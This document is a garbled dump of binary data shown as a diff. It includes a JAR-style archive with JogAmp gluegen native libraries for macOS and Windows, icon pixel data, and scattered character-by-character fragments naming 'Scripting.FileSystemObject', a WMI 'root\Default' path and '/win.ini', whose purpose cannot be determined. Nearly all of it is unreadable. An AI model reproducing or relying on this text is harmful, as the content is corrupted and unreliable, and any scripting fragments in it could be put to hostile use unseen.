+  Üöû”Ìöõi   ¼ö
+  ¼öû”¬öõn   œö
+  œöû”Œöõi   |ö
+  |öû”löûïLö`ıÇŒùLù<ùû”,ùùû”ùüøû”ìøÜøû”Ìø¼øû”¬øœøû”Œø|øû”lø\øû”Lø<øû”,øøû”øü÷û”ì÷Ü÷û”Ì÷ Šd FÜûûï¼÷`ıÇùäùÔùû”Äù´ùû”¤ù”ùû”|ùlùû”\ù`ıÇDúÌûLúû”4ú$úû”úúû”ôù`ıÇ\ú
+  2 \úDúùŒù6‚ löôù\ù¼÷LöLø<ø,øøøü÷ì÷Ü÷Ì÷¬÷œ÷Œ÷|÷l÷\÷L÷<÷,÷÷÷üöìöÜöÌö¼ö¬öœöŒö|ö\öÌûLú4ú$úúúäùÔùÄù´ù¤ù”ù|ùlùLù<ù,ùùùüøìøÜøÌø¼ø¬øœøŒø|ølø\øõw   Ìû
+  õi   Lú
+  õn   $ú
+  õd   ú
+  õo   äù
+  õw   Äù
+  õs   ¤ù
+  õr   |ù
+  õu   lù
+  õn   Lù
+     F<øõ/   ,ù
+  ,ùõw   ù
+  ùû”ùõi   üø
+  üøû”ìøõn   Üø
+  Üøû”Ìøõ.   ¼ø
+  ¼øû”¬øõi   œø
+  œøû”Œøõn   |ø
+  |øû”løõi   \ø
+  \øû”Løûï,ø`ıÇù h |ùlùû”\ùLùû”<ù`ıÇDúÌûLúû”4ú$úû”úúû”ôùäùû”ÔùÄùû”´ù¤ùû””ù`ıÇ\ú
+  2 \úDúù6F <øLø”ù<ù,øÌûLú4ú$úúúôùäùÔùÄù´ù¤ù|ùlù\ùLù,ùùùüøìøÜøÌø¼ø¬øœøŒø|ølø\øõr   Ìû
+  õe   Lú
+  õn   $ú
+  õa   ú
+  õm   äù
+  õe   Äù
+  õn   ¤ù
+  õu   ”ù
+  õl   lù
+     FÜ÷õ/   Lù
+  Lùõw   <ù
+  <ùû”,ùõi   ù
+  ùû”ùõn   üø
+  üøû”ìøõi   Üø
+  Üøû”Ìøõn   ¼ø
+  ¼øû”¬øõi   œø
+  œøû”Œøõt   |ø
+  |øû”løõ.   \ø
+  \øû”Løõi   <ø
+  <øû”,øõn   ø
+  øû”øõi   ü÷
+  ü÷û”ì÷ûïÌ÷`ıÇù l ¤ù”ùû”|ùlùû”\ù`ıÇDúÌûLúû”4ú$úû”úúû”ôùäùû”ÔùÄùû”´ù`ıÇ\ú
+  2 \úDúù6R Lø<ø,øøøü÷Ü÷ì÷´ù\ùÌ÷ÌûLú4ú$úúúôùäùÔùÄù¤ù”ù|ùlùLù<ù,ùùùüøìøÜøÌø¼ø¬øœøŒø|ølø\ø 
+ô  °  !ııè  ı Ÿõd   Ìû
+  õc   Lú
+  õ2   $ú
+  õk   ú
+  õ5   äù
+   D ÌûLúû”4ú$úû”úúû”ôùäùû”Ôù`ıÇDú C\ú\úõ  €Yı
+  2 \úDú6 ÌûLú4ú$úúúôùäùÔù }\úı $  	 ıX 
+ >\úFÌûLú
+  LúõF   4ú
+  4úõU   $ú
+  $úû”úõN   ú
+  úû”ôùû3ı6 Ìû4ú$úúúLúôù½7 õ    D MÜû@
+  tdõõ    õS   Ìû
+  Ìûõc   Lú
+  Lúû”4úõr   $ú
+  $úû”úõi   ú
+  úû”ôùõp   äù
+  äùû”Ôùõt   Äù
+  Äùû”´ùõi   ¤ù
+  ¤ùû””ùõn   |ù
+  |ùû”lùõg   \ù
+  \ùû”Lùõ.   <ù
+  <ùû”,ùõF   ù
+  ùû”ùõi   üø
+  üøû”ìøõl   Üø
+  Üøû”Ìøõe   ¼ø
+  ¼øû”¬øõS   œø
+  œøû”Œøõy   |ø
+  |øû”løõs   \ø
+  \øû”Løõt   <ø
+  <øû”,øõe   ø
+  øû”øõm   ü÷
+  ü÷û”ì÷õO   Ü÷
+  Ü÷û”Ì÷õb   ¼÷
+  ¼÷û”¬÷õj   œ÷
+  œ÷û”Œ÷õe   |÷
+  |÷û”l÷õc   \÷
+  \÷û”L÷õt   <÷
+  <÷û”,÷ış\ú÷
+  ÷TõşN/\ú6f lø\øLø<ø,øøøü÷ì÷Ü÷Ì÷¼÷¬÷œ÷Œ÷|÷l÷\÷L÷<÷,÷ÌûLú4ú$úúúôùäùÔùÄù´ù¤ù”ù|ùlù\ùLù<ù,ùùùüøìøÜøÌø¼ø¬øœøŒø|ø'Üõõw   Ìû
+  Ìûõi   Lú
+  Lúû”4úõn   $ú
+  $úû”úõm   ú
+  úû”ôùõg   äù
+  äùû”Ôùõm   Äù
+  Äùû”´ùõt   ¤ù
+  ¤ùû””ùõs   |ù
+  |ùû”lùõ:   \ù
+  \ùû”Lùõ\   <ù
+  <ùû”,ùõ\   ù
+  ùû”ùõ.   üø
+  üøû”ìøõ\   Üø
+  Üøû”Ìøõr   ¼ø
+  ¼øû”¬øõo   œø
+  œøû”Œøõo   |ø
+  |øû”løõt   \ø
+  \øû”Løõ\   <ø
+  <øû”,øõD   ø
+  øõe   ø
+  øû”ü÷õf   ì÷
+  ì÷û”Ü÷õa   Ì÷
+  Ì÷û”¼÷õu   ¬÷
+  ¬÷û”œ÷õl   Œ÷
+  Œ÷û”|÷õt   l÷
+  l÷û”\÷õ:   L÷
+  L÷û”<÷õS   ,PK
+   v2IG¼Úë¾‡  ú     META-INF/MANIFEST.MF’MOã0†ï‘ò|„•ìÚ¡I›ÜR„P¬VĞİ+rœijäÈvXø÷8|¥´8ú}Ÿ™y3™nä|ÀÿÀyiM…¡iR›=¥î¹ØŠZ4—$K“s<@‹WÏ#_z_ä¸as</
+Â0c7ó+ĞIİ÷
+ĞÚr{Æ‡<Äø7×P¡K5À%t;¼‘Òä®!·ÔFµ‡]ñGVÒ´ÒtEÖV}æÎÈÙ±gZë*te»Z÷èÜj=Ód­cT&|;zJxÀí7s`¯©ÚW7%¥8£,g”–Ç ãFì*dì¤™iî¸#jÌ+C…„`P6¢(—ÍbË-Q`lN³äg,cym³%ı&î¿ÿÄë^XMlÇuDı½½®Ğ.„¾šÍŞb]7K“‹§ ÆOúİ4±ìïHlª­I“üxI×²qÜÅs
+nˆ[şNK?6ğâJá~¾^Ò{!®•²ÿy£ .©…†û8õW¼ÔéA¦„i’&/PK
+   v2IGÈ4v   Ÿ   2   jogamp/nativetag/common/macosx/universal/TAG.classMK
+Â@Ë³?-.ô*ÂC×"ˆ—nÄısJKgFìX¼–+Á…ğPâØ	!ù|_o Kä9"dú„tUÚÒ¯	Ñdz$Ä[wÖCÄHóÊb.lÅ—­öR°rÆ8ËF”kî|³!¾6Róa³#Œ*i…k±ïO•VôÂÕ6ƒ¦Á;$³'èÑğPK
+   v2IGÖ^4İ  p‰  -   natives/macosx-universal/libgluegen-rt.jnilibí]l÷uÿR¢dÆQB&SR¥qjV£·4]l*Uu66ÉÕ§LŒU[t•dEI'™)…<zRW!2$gşâ"L43:À(‚u¨t†x†ìh‘â+Óª­
+h )	h±±¸eß»ï÷È#ER´•¡íöı wï}ïŞ{ßwï¾ß'’wß§k¿~ë2!¤¶]°Õâ òå9Ø5YòÇúğXß;üÇ'ÿıkş%Ÿ4ÂvlBÎïÿ$	;Ÿ¯_è/Qt(ê7p}„Ï§*ãjA´T
+„ÿÆÆ¨ÕlÓJ¦
+:ñ‰ĞP$è‹«‰¡26lwò§“	[³ÑÈl€²ï¤Œ*±26ÚA÷(§uf?Ì~ÇÕX <VáZ^İ{,Œša¶6"á¸jjÛø–û8­Ÿ/ş«@xÄFÊØøèÊœÖU°q²ê÷³»«¿ËtÂQ¼ã¡>ß÷ÈDpÄìËV}§•úöù‚~ã–FÕØ6ĞİÃ©ÙÆ.¾q?üª¿².O®*~`tİ#‡ŸúŠé„“_¿³8†Ÿ/I•Bü·êrZÒ·1S@'òåMl±1èdq¬bıïĞu{{ş©»ÇnBæî(Ğ]¤x^à¼şØZJCcÁ„2¦„©ûá>†ô¾Q´Ò
+$ùÄ&Ô„ıhøÛga{îQ9¼úEÓÃÍîõƒ¼ùêÌµ¦GÛN|ÿW§¿úÏ/n¸ŒnØMÈîİúí\–Åå_­ØûD<v ÆíØD\UBûóK(£ó ¥TglxØßßf¨?âı¦Ül|Áğ£­ÊÅíÓ¶¾¯¦‘ĞÎƒë¥½®&íì)ÆÙx{tŸzæRsEğÒ÷§7Z4É¡yš4¯zoRÏ&•>Z’²¨uzò#$ö™‡`¯I75¢M½ãZóÜÔ¼Ñ&íwYsI*eÛŞÄûyPÊÚ¥+g¯Ú/^^l9ñ6Ø?>½áÒ¤fÍãĞ¼MZÂF›t¥êIkRšZ]éËpû©´®IëÓ‹®çO¼=ºß¾wF¿>Ã¿&Ícc¥¿¥gOOêÚÏà­Z’nb#ÃÜÜD7¿]‡nnjŞ¬ÉÍ›pº_&ûÇ¾öò yš5¯CK4i“6:¹N)ê]£Õ%i……c	•®Ûg¾ShÛgğ÷î¶Í³®İ¡Ñ7°gïº–X£Í.ªº¬Kİ.Ó[Î½G¥•Ó“+Ìõ~İİuÍ¦}µEëéĞ×g/¿‰—÷_ô¯­´J‹Ô³û‘æ¹>ûê
+ÿ=n£OZ58Ñ¨yáÔ’´AôëO³.eÃ8c§I+šgb£ÁšjD™dŞíÏóş!\ÿ¤‡k]ó®i‰1ğİ–KjR’^¹òË½î•gî˜æİ˜^ì}Ş÷Ü‰·ç*Ä¯E›lÒNØè‰u:™¢5ê]¥‰•%)É¢¸Â£aDq¥ZW¶Dq£W‘¬ÅåÙË¦(.PÏ%Œâòì«ëæ(.`/mâü–(®j¤ÅÖ}äİ.Å-‘,‰âõÊQ,™66ŞßÂ?FÔs“J›49½hƒy1W<ôS©%‚Ã>ı Îº¸Æ‡x7Ÿ?†=K{ÆùºmÎWòçÿÊyÇo¹Û­ú§–_yoû˜z7©Òkö`"kŸùcmÕó6dCıVÚSˆGLÃ»>óèš0@ù˜OkØZ§Ë0Y^6úk7'dššõ¤©m©Sÿ,Ş­OŞ—ÓõzZ§ËÔ›ºñÁ›?öAjHQif!!ÜÈĞä•ôŞ+Ÿ4Z®·¹Wó¬YŞÓ¼«÷\¥ËÓ‹íÏóëg×W±¿s–|‡í¦ş4O
+.:´dï¹fò_ÏW‡Œ|•ÿ£´A½03×—¤Kk,U­³Œ°jŸy£Ğ¶ÏüOU…Tµ¡%Ö·¤ªLU©Ó“)–ª³d2{ö]S¹W;
+	kC›ÜĞş\{©E;±A÷èY†Bşğ^Ïı²÷ì«ÓØhwÑn8Õï‚q=—|Gú³h&Vš¬fÏş4Ú~„Ñn×Íå=ò.¦Ãºgkùkaùk£¿6ô¼›*Ê_ù¿ïkönøû~Öû¡ı¢ôáôâ!–Árûğ“wn_“¾wèûf}ß¢ï÷è{§şqè$ŠfßÈå€G…ÌŒGµÌ#ŒGåÌç&2÷2eæ2Ÿ|üşSşAxìÀ‘„zdÔ£„"±	)‹ÄÈ“ş@Pqªç˜¢:½ıO>Úá>éÅ£‘˜ÓK„”°êlÎİê„a¿8¥8Gñ¨_>©ÄtÁÖ‘`$ª„[oÅ^[u{ğu¦vs£aH©f/×|J÷«j¬•GBûıÑhPÙÿbÂó‡Õ@XÑ?oï!fŠi¿Kãç]ÜlüÃ6òø¦	4EŸúMp¤şÖ~î„­¶ØF`‹ÂöÍ»Ë«	üş ŸÛá:ÆóëO»-              ğÛÇî»õw­Nïçt§­œ>Ìé~Nç´‹S§Ïpªpú"§“œâ«#õ@›8upÚÌi§{8urŠït[Pß©¿ãmmáôaN;8•9àtêN×ÁÎÁ…ºdÓí,F4ÚG.4râpXò7àûHvèdêNBz8?ØDÈKœÏÂñáü8şçyÀÂøó»	yóSÀ‡ówòÎ§€¤ñdÂœ?Çÿ™óN8ş!ç€?TÏøNà_âü ğÿÆù(èî¶2¾ø£œïŸ_ã¼øŸp>ºÍÜ–óø’÷9Î;!6?4d€·6r€vpoê×õ{£¿`¢šøIÆÄ¿bâÏ™øïšx|7ßmÁ7#?Û^ÂŞÉşü6ç¾§ü§ü¾áHÈ÷BdÌŠ"Š„}á@Ä×	„U%v81:ªÄ|cŠÚˆ)Ã*kwŒÄ”x¼'V4‰ûú‚~u4ù†±˜Vû!ÅEâ·®*k%Ô@ÎÅ¼HGãOëoõ†ºT52‹•^8ò=uÜ£ëÂ5à¾¡”¯<şá“°ÒíWı=áÑÈÑDX¿00]ÁÀXß]ê$†‚Š)(·cäÉ`Ä¯îĞFOXm{bç6¾ôØÎm<Ñ¾s;7±C½‘ğØ§rwÑĞMğ‰y{VúücÊ1å=áÃª¿M#ÌƒÛAGFwWfaS†¸íÂÔw::
+Vªé{Ãñî‰°?î„¿ÎF€o$8ŒÄ+f­JJŠşÆè-*ák¡·ªŸ‘‚“ùc\ ‚€ÁˆŒø'ˆÏô‚'ñÅ'âÃ‘ğ(‰ùGbzàÀãO´µ?ŞşØ§ıéN@@@@@ <~ÈÖÿ[Œõÿ¸SæëÿÀ6^W¡ ÂY¾mÔ(¬İ®^àü=Œş`W¡]©6 ÓÇµıñŠöú`ôS»¨N€µP' `¯r­€)n¯ßÔ.Z£½Å¿êuV¸=‡¥¸m tıúv5²Ÿeô>S»(~[ìU¯'`{Ñ>S»ÒšzfO9éùCJyÿ¸½óÖB»T†££\­'§òí[®]à,6‡íj~mWÇÀÁíu˜Úf{æzÌ^dè…aV oE©=™Û³™ÚÕîÆM&åë ğw¢rírõP¤–z£fÀ€›Õ¸°Ãšãejì"…šÏ¾üeß?ºÿÜ±o^{÷àµL¹šäÖj ¶êm_7 aÔè(©0à®r‘&të}èkär]ÇrûÀ7"û^’Û÷40¼ŞLß—§7œ2Ü”i"+SoZæ5PäÓ“z•û>-—5iSÖ€L¹waäµD:—”©”ÂÒ1mz}!ù 'e—®v}§Ó~ñyzÑY\ß¨\Úd:½+_ŒéØ÷Naß&yM¤ÓïÃ—BìRÎ×TÁ¯šàò&¶2ÜÓ,ó´£A÷Z‰”îé¦~z£¬>³ßgØ°^•ÌKUå{™ùvQ‹½^ÎUYó€ñ;dÊæ®Şƒ®’r¾@V}‘g£Ñä[g”Isı·¬yÁƒÉ™ş´çÁÆì}³º{çáøuRé™^b®úbI-±–ş÷=>Ë_‹CÒgòºL‚M¤¡éƒĞ˜ê¯•‰L=«¦ ­hµ† ­VĞtÃ­èRC• yJœH¦¿oÍGhu›­VŠPÑxÇWŒÑÛ?ÇüC&º”>„NL/:˜x±ü¼¥º½ùºmÎ[·9¿¿;Öÿß¶ïø¿şbÿŠë-ò|†³(ô¤Y%¦jy6s›V êIñQ©Ğ”d¹}·<Yù]z­ĞÇ’LšÆNobY.9àM!íÆ
+ŒÒZ7…)äMşı_ÊÃYL%²å†Lq°»õ,Ï•ì?ca¦±—<éÂò?`]¦If)ï_q>Y’ô‰È‹,2×ëE­3ÛçÜÕüœ>s”¥·¥†”²ÌRÊ‚Ræu<†)e«låÊVÛYÖØÙÕô˜rVjLº«¦rZ+¼œVÎ~QÊ±ä’Ûw±«eÍëû·ôı%}Yß/èû«ú£øëNÉ4oærÀãkrãO#ó†Îã«t™,ã±4bfñ	äWÿ"ò×Å´Š‹i™Q¶°!Ukká³(£¶–—?§)ÔÖª#Íì—b‹“Ò.oæ6ê¿q”XÆGÓ.Ûœqq»òÇ9ŠáX×İ—ë¾r—ñ<j;ıq®ÿ…
+ú(È—{¶Š\¶y.wŸ¥²Ük°]¸Áä>SAn;¿ç6™şlã÷Y.×ZE.X£½×LöªÉ]ÂxÕ ‡e÷ÆkÃ ­A®äNÖ ÷—ønr3 7PƒÜ÷ğ]áäV0£Ö wß7®AÎÓ¥£¹^s× §‚ÜÃ5ÈaEaç6rÛ_²Y}>m§oôß_AßÿÆıû³ÛìÇĞwU˜§y8|¹—°î:£ÆsîW8}Ó78½Àé%N—K[üîuÔÒØÂ©“Ó‡9usÚÁi'§çÿ°¹)ê<_w~ëºúÁÁÎ¢uõØ±¶ŞıÖ¯±¾>ËÛÆû9Ş6ÖÙ»[X;¿Ö¯0ÖÛ÷İÏÚÆš{7oëî£ü…xcíıoëï/ğ¶±¿·uøIŞ6ÖâG¹}c=~–Ÿ7Öä;øyc]¾“Ÿ7Öæ/èëó³\ŞX£Ÿämcşokõ<>Æzıü¼±fß}/kç×íóv~í>oë÷Sü‡0ó~„ZÒ,iŸ)i¿RÒ>WÒşnI[¬ïëûÅú~±¾_¬ïëûÿ?­ïÿPK
+   v2IG¼Úë¾‡  ú             ¤    META-INF/MANIFEST.MFPK
+   v2IGÈ4v   Ÿ   2           ¤¹  jogamp/nativetag/common/macosx/universal/TAG.classPK
+   v2IGÖ^4İ  p‰  -           ¤™  natives/macosx-universal/libgluegen-rt.jnilibPK      ı   Á                                                                                                                           üüüìììßßßãããëëëõõõııı                                                                                                                           ğğğ¸¸¸ˆˆˆŒŒŒ£££¼¼¼ÒÒÒàààéééóóóûûû                                                                                                               uÂÛšÉ‡©(tBhtaaaqqq………œœœµµµÌÌÌÜÜÜæææğğğùùù                                                                                                   tÁÚ#©ÖhÉì(­ß Ò™Ì„ª#x”;k{Ycfmmm€€€•••¯¯¯ÆÆÆØØØãããííí÷÷÷şşş                                                                                    d¹Ö.®Ù£åÿlÑÿlÑÿfÎüKÀï0²â¤Ö™Ìˆ²{›4m€Qdjgggwww¨¨¨ÀÀÀÔÔÔáááëëëôôôüüü                                                                        9«Ñ/®Ù¦çÿoÔÿoÔÿoÔÿoÔÿoÔÿoÔÿoÔÿTÆò9·æ¨ÙÏ”Ã£-p†Ifpdddqqq‡‡‡¡¡¡»»»ÏÏÏİİİèèèòòòùùù                                                            9«Ñ0®Ù·ìÿr×ÿr×ÿr×ÿr×ÿr×ÿr×ÿr×ÿr×ÿr×ÿr×ÿr×ÿ]ÌõA¼é%­Ü¡Ò™Ì„ª'sBht[ehnnn‚‚‚›››µµµÈÈÈ   åååîîî÷÷÷şşş                                             9«ÑÏ¾îÿuÚÿuÚÿuÚÿuÚÿuÚÿuÚÿuÚÿuÚÿuÚÿuÚÿuÚÿuÚÿuÚÿuÚÿuÚÿgÒùJÂì4¶â¥Ö™Ìˆ²"w”;k{Rfljjj|||“““©©©ÄÄÄåååûûû                                          7©Ï™ÌÁïÿxİÿxİÿxİÿxİÿxİÿxİÿxİÿxİÿxİÿxİÿxİÿxİÿxİÿxİÿxİÿxİÿxİÿxİÿxİÿqÙüTÈï=¼æªÙ™Ì	»{›/rˆJgpqqq«««ììì                                          Í™ÌÃïÿ{àÿ{àÿ{àÿ{àÿ{àÿ{àÿ{àÿ{àÿ{àÿ{àÿ{àÿ{àÿ{àÿ{àÿ{àÿ{àÿ{àÿ{àÿ{àÿ{àÿ{àÿ{àÿ{àÿ{àÿ]ÏòFÂé'°ÜœÏ$y–ŠŠŠâââ                                          ™Ì™ÌÆğÿ‹æÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿ~ãÿN¿ò†¬~~~İİİ                                          ™Ì™Ì£àõ’éÿæÿæÿæÿæÿæÿæÿæÿæÿæÿæÿæÿæÿæÿæÿæÿæÿæÿæÿæÿæÿæÿæÿæÿæÿæÿæÿN¿òˆ²qqqÖÖÖ                                       ııı%©Ù
+Ï™Ûò•ëÿƒéÿƒéÿƒéÿƒéÿƒéÿƒéÿƒéÿƒéÿƒéÿƒéÿƒéÿƒéÿƒéÿƒéÿƒéÿƒéÿƒéÿƒéÿƒéÿƒéÿƒéÿƒéÿƒéÿƒéÿƒéÿƒéÿgÌÿ™ÌiiiÌÌÌüüü                                    ÷÷÷'ªÙ'ªÙ›Ûò˜íÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿ†ìÿgÌÿ™Ì\fi¾¾¾ööö                                    ¸Şë(ªÙ(ªÙİò®ñÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿ‰ïÿgÌÿ+³ÙElx¯¯¯ğğğ                                    ¸Şë)«Ù)«ÙxÌé°óÿŒòÿŒòÿŒòÿŒòÿŒòÿŒòÿŒòÿŒòÿŒòÿŒòÿŒòÿŒòÿŒòÿŒòÿŒòÿŒòÿŒòÿŒòÿŒòÿŒòÿŒòÿŒòÿŒòÿŒòÿŒòÿŒòÿgÌÿ-³Ù7pƒ¡¡¡ëëë                                    ·İê4°Ü4°ÜmÇæ³õÿõÿõÿõÿõÿõÿõÿõÿõÿõÿõÿõÿõÿõÿõÿõÿõÿõÿõÿõÿõÿõÿõÿõÿõÿõÿõÿgÌÿ[Ìæ*v”””æææ                                    µÛèV¾æV¾ænÇæ¶öÿ’øÿ’øÿ’øÿ’øÿ’øÿ’øÿ’øÿ’øÿ’øÿ’øÿ’øÿ’øÿ’øÿ’øÿ’øÿ’øÿ’øÿ’øÿ’øÿ’øÿ’øÿ’øÿ’øÿ’øÿ’øÿ’øÿgÌÿiÒé}‡‡‡ááá                                    £ÓãX¿æX¿æoÇæÊ÷ÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿ•ûÿgÌÿæò†¬zzzÛÛÛ                                    vÃÜZ¿æZ¿æG¶ÜÍøÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿ˜şÿgÌÿŸìõ	»nnnÕÕÕşşş                                 vÃÜ]ÀæhÅé:°ÙĞøÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿ™ÿÿgÌÿÈÿÿ™ÌgggÉÉÉúúú         PK
+   k2IGŸìP}  ô     META-INF/MANIFEST.MF’IOÃ0…ï‘ò|$»v ´É­E¨*b®Èq¦©‘7ÙË¿ÇeK!8ú½ofí¹àF®!D|>Hk*ÄÍ³™ÙQf‹ ¤%³$GyvâGhğüuËO	}8¦¸.&hïÊs¡ Xï¬ç1Õï§nÎ))ŞOø’k¨ĞBu° ƒn:ƒWRCİ:rıE­dT;Øâh.M#MPR õ¶şwÕwâ‚=ÓX_¡3ÛÎ´KµîŒŒ¯y¶ÔNÿİ'üÅí#ÅÀwR5ï&®KJqAÙ˜QZAÏØTÈzÙJ3Ò<Dğj›WÆ
+	Á ¬Åq9­'kÆh9IcG´˜Àøl<.ÖÅ”ş÷Ÿ÷ÿ ñ2…V“GÛríÔİÍy…61ºj4ú@ˆõí(ÏN_"˜Ğÿô§iRÙDŞ’ÔT[“g+ß…íËÚsŸ)ú.½ò5x-Ã¶A¨W
+»^ø¹IŸ…x¦”}æµ‚ôHÔ<¤©iGûéæY½PK
+   l2IG®¯	Ö   œ   /   jogamp/nativetag/common/windows/amd64/TAG.class;õo×>#..fvvvNF6›Ì¼Ì;FfÍ0Fçü”TVFÍ¬üôÄÜı¼Ä’Ì²Ô’ÄtıäüÜÜü<ıòÌ¼”üòbıÄÜ3ıGwF¬Ä²DıœÄ¼t}ÿ¤¬ÔäC& = À„@$'æ30°jmg`ÜVÀ  PK
+   l2IGt:¼
+   H  $   natives/windows-amd64/gluegen-rt.dllí\xÓU–¿i“’J*P¨
+……ÚºÔ±;Mğ/¦h‹Šmš&%&1ı§_Sl#óŸX§ø@ouû³®ëèèÌ§¼|ŠyM-‚(Îˆè8)Å|,/•ìïÜÿMHê*Îì7»ü¿ïôÜÇ9ç{î¹÷œ{[(]ÜÆcZ@$ÂØ¦~ùì›¿&ÀàÑ›³ç’wÙ 1ïS¾ÔYoôú<µ>kÑfu»=²±ÚnôùİF§ÛX4¯ÌXç©±g¥¦¦Œ2,ÅŒÕÜ5ÍÉ±0*÷Ë;0!a3¢B„)€a€4ê½ÍÆ‰¨œ êMŸ*ôu©“é®a|^Œ‰òÆbuQÄd ÜÆØ®¤¸IZ Bb\=ÄXö×åYÆ2ÏÓüÔÆ¼š¯fË’í+dàCW…ŒììäÄgd–ª¬«lEÙK¤M{\_º|f	eùTÂc‰L]L’5áºü,¯JÇçht“ûÓeçg­Pé²i¼*A—uºêúz®ZrTÉs¿&VÊ²«ò¸Í› zÀ´óÈsªt|MÚİ5çĞ…²
+”Syıhv)èO—Ê’]\?š*­§+êOı|v—Ç&Ö:$èf3n¿şñ¾2©ù¨q#ƒg†M£“”IÙ~«'JŠn×RjÔí’‡æ„¤N¾¤æ­Æ:£óÙM\v4•W\¿tKÊîRe«¿.¨[[ÉX d¸g0¨›Ãšœã/›¢»íR0oç*ÆzqşaySR“¿e§á!8¨[€bóÉCË[`İ8?Âdq
+ÜT¹ÄtcGóioò÷Ú¥ v<­_Îq)¸Hql4Nš”Ûah¦9g¬SµêXïæê>¨¥Ñ4†–© êöÕò	´|É¨ÖíÎÀACË~Ò!¨{å
+.AN-Um"‡‘”HW³níMŒiú+êàóÍ	õü(‰ ÒÂ×C
+¦şÒÃÃô\”¤l“KĞVJmäû´@Í½z)÷C¥àP)Ğ-ÿ5Ò-š>’”ÃÊå ëÔ¯UWÅDQìÔ%‹VrµN_{®ùøÂô|q†«T$ßu m$©Ù&µ¦÷´’¤WĞÆy[S·£!|9Fíy|êÒ|qªİ¨‚¡½•“­!²Ï.#æ;ê†êy…Â—¿ğLòß+{ÍÊ«JúpLÿ¬ Î²„A¾)¼îY¢„s@s*<ùRxÒ¶æÏ-Ï0u9şƒÏuÌ(
+i‘ˆróË¤ùu8ÚÂ·‚·µ0‚åkÌåm’1ëËHËx”{KoÇY}š?×iFİƒø *Ãó¤Š²Í¿ş;sºÑCí =Vi¯¼ÿE$BJn ;ÆäÇ$Ögœ­(ÛÂÏ}Añhl(:Ö“&¾1úB¡!ğãI†š(ÄÌR='Îğá‹§ÂgF­z~†¤5©;ù(dÈª[`óÈ©°–Ô#s’|¦”Ë–ó¸™f¥h\fø£°ÄRcæ ªRA¢ XÚ°ì·£[Ù,EFÓ®ğ£ŠêOÑõ-¼&);±¼fe<G
+jŠsBfeè„ãwÊeØ>’²%’şÃÛiâ'%åIyU
+&JÊ[‘6Â¶±µåò1^êídvÒ@t©ƒG÷W"<2éŸˆ÷-)èõF,ÙæV]ºhÀhûsB½O:úùãÌRR	ún“ë ¬tmF(À-Û*i$Ûká1$£“FDäÅRğ‰CIBê'*5æˆ²	šQãmãŒ‘}X•Hú}·ñåÁŞïAÅP}&ŸÙ½9¯E[0R“0MæÒÕ	<7¹Ï^iÙ:'íå!Q½³p‘:Úú|(¾Æù?øI­f¨šşÒ­8ûŠÆ×¢h???âè7$ô«kûÕõßĞÿméû÷§}Kùÿ#ygíC–LS-)›¸)#‡rBqö‰H[Òa0ó¸q›ö–V§™mEãŒÊöÍ§FŸ8RêQèÙ|:iÒÉÖ]ÒªM£åí ıÇŸ~‰Ø$[9Ìîå˜¤éâ´b¼ènŠzçu+q—£­T¢„à¤uß>bãD}ìáNŸdÆ¹“nRwÚ›?‡a'bÒo«p¸4$çdDÂñ`”6’ùÂÓy k#‚ë4¼|w	Mø4˜[éô€üÖrÌŸ,Ÿ#:3U;Â4j4º9$%ÂµŸb:5¼1,ºO²oè µÓ?\)ÒÑ(ÎX'<#”Ô\z®Ç«±FÎh>(Y¥#¶ÿÃÇY«CØ»9/û4ANéÔ®†²æÓ	ò:?o[ÄËQ=wQø»ê0¡ÜOåCü€É	,dÂö§şâYÂNŒØ»IœÏq®¥ê«lïˆ—TïWO+	ö]D«„ã{ÜUfœáKUKÿçP¤i®Ù&ÖÜ*U!:×OÄdïJv—AÔB%Dt–(ÇÂ·£nÂ6‡£O¼6-4UÄr¾*IÙLí© Ö7q¶^3Üó_Jİ.4æt´™ƒ’Şœ»Ç‡äÅ’\ /Ñ¼ªáÎ7È„©9”‘»Óÿå1—ø9U¢l5´<ÌÆ…Hc;hnqƒu$–lş0Ñ¬ùTR
+ÓÔÄ4ü"˜LIƒL(õÃn1+GĞôO'‘bÁQFÆæÍÙúÈ^:[Œ~®•7ŸÔ›IİxPjT	œıcA:æ,©ÿ*ØO£W¥¦O¦%¦›z¬C‹ùªtpTí}ÚÑÖ|2_Ş&AAÉŒ=>Å´!Ÿ©®NDï7 cÙ“1$:\¾<cÊ#ŠPÂ9¹ÎÙÛÖWƒĞZ®†Ó›ƒ©eå´Úê(QRÍÇ‘ô†ÒS”Şåç9ÚŸÆ#AØ^÷e,ÿ;Øã¥,.¨K)çÁñªõsƒEÙúğİ_RŠ—Z1Öü“ğíjÕ1Nc›È€a'ÚÚbñÔTN¾¢ü‰Ü%8êé2ÊØäI9
